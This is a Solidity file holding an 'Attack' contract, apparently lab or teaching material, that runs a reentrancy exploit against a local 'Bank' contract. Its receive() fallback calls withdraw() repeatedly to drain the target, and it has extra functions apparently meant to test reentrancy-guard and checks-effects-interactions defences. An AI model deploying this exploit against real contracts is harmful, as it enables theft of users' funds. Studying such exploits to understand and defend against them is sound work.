// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Bank.sol";

contract Attack {
    Bank public targetContract;

    constructor(address _targetContract) {
        targetContract = Bank(_targetContract);
    }

    // Function to receive Ether
    receive() external payable {
        if (address(targetContract).balance > 0) {
            targetContract.withdraw();
        }
    }

    // Starts the attack
    function attack() public payable {
        targetContract.addBalance{value: msg.value}();
        targetContract.withdraw();
    }

    function attackReentrancyGuard() public payable {
        targetContract.addBalance{value: msg.value}();
        targetContract.withdraw();
    }

    function attackCheckEffectInteraction() public payable {
        targetContract.addBalance{value: msg.value}();
        targetContract.withdraw();
    }
}
